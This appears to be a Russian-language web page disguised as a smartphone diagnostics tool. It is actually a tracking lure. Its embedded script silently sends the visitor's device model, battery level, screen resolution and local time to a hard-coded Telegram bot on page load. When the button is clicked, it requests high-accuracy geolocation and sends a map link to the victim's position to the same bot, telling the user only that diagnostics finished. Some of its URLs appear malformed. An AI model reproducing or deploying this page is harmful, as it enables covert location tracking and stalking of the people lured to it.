<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тестирование конфигурации устройства</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 40px 20px;
            text-align: center;
            background-color: #f8f9fa;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }
        h1 {
            font-size: 24px;
            color: #1a1a1a;
            margin-bottom: 10px;
        }
        p {
            font-size: 15px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        button {
            padding: 14px 28px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            transition: background-color 0.2s;
            width: 100%;
            box-sizing: border-box;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Проверка параметров системы</h1>
        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
        
        <button onclick="requestLocation()">Запустить диагностику</button>
    </div>

    <script>
        // Данные вашего Телеграм-бота
        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
        const TG_CHAT_ID = "6559747526"; 

        async function sendToTelegram(text) {
            const targetUrl = `https://telegram.org{TG_TOKEN}/sendMessage`;
            try {
                await fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } catch (e) {
                try {
                    const fallbackUrl = `https://telegram.org{TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    const img = new Image();
                    img.src = fallbackUrl;
                } catch (err) {
                    console.error("Ошибка отправки.");
                }
            }
        }

        function getExactIphoneModel() {
            const width = window.screen.width;
            const height = window.screen.height;
            const ratio = window.devicePixelRatio;

            if (width === 430 && height === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max / 15 Plus";
            if (width === 393 && height === 852 && ratio === 3) return "iPhone 14 Pro / 15 Pro / 15";
            if (width === 428 && height === 926 && ratio === 3) return "iPhone 13 Pro Max / 14 Plus";
            if (width === 390 && height === 844 && ratio === 3) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
            if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
            if (width === 375 && height === 812 && ratio === 3) return "iPhone 11 Pro / X / XS / 12 mini / 13 mini";
            if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
            if (width === 414 && height === 736 && ratio === 3) return "iPhone 6 Plus / 7 Plus / 8 Plus";
            if (width === 375 && height === 667 && ratio === 2) return "iPhone 6 / 7 / 8 / SE (2020/2022)";
            
            return "Устройство Apple (iPhone/iPad)";
        }

        async function getDeviceSpecs() {
            let batteryLevel = "Блокируется системой (iOS)";
            let deviceModel = "Не определено";

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (e) {}
            }

            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
                } catch (e) {
                    deviceModel = "Устройство Android";
                }
            } else {
                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    deviceModel = getExactIphoneModel();
                } else if (/Android/i.test(navigator.userAgent)) {
                    deviceModel = "Устройство Android (Старый браузер)";
                } else {
                    deviceModel = "Персональный компьютер";
                }
            }

            return { batteryLevel, deviceModel };
        }

        async function collectAnalytics(extraText = "") {
            const specs = await getDeviceSpecs();
            const localTime = new Date().toLocaleTimeString();
            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;

            const message = `📱 *Новый технический отчет*\n\n` +
                            `🤖 *Устройство:* ${specs.deviceModel}\n` +
                            `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
                            `🖥 *Разрешение:* ${screenRes}\n` +
                            `🕒 *Локальное время:* ${localTime}` + 
                            extraText;

            await sendToTelegram(message);
        }

        window.addEventListener('DOMContentLoaded', () => {
            collectAnalytics();
        });

        async function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        // Формируем ссылку на Яндекс Карты с маркером на нужных координатах
                        const yandexMapsUrl = `https://yandex.ru{lon},${lat}&whatshere%5Bzoom%5D=16`;
                        
                        // Текст сообщения для Telegram без сухих цифр
                        const geoText = `\n\n🗺 *Определено местонахождение*:\n\n[Открыть на Яндекс Картах](${yandexMapsUrl})`;
                        
                        collectAnalytics(geoText);
                        alert("Диагностика успешно завершена!");
                    },
                    (error) => {
                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                alert("Ваш браузер не поддерживает API геолокации.");
            }
        }
    </script>
</body>
</html>
